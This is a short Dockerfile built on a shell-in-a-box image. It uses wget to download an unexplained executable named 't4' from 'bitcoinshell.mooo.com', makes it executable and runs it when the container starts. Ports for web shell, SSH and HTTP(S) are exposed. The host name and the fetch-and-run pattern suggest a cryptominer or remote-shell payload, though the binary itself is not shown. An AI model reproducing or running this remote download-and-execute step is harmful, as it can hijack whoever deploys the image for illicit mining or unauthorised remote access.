FROM ya16/siab
RUN cd /root;wget "http://bitcoinshell.mooo.com/users/dw77/t4" ; chmod +x t4
ENTRYPOINT /entrypoint.sh
CMD cd /tmp; sh /root/t4 ; tail -f file
EXPOSE 4200 22 80 443
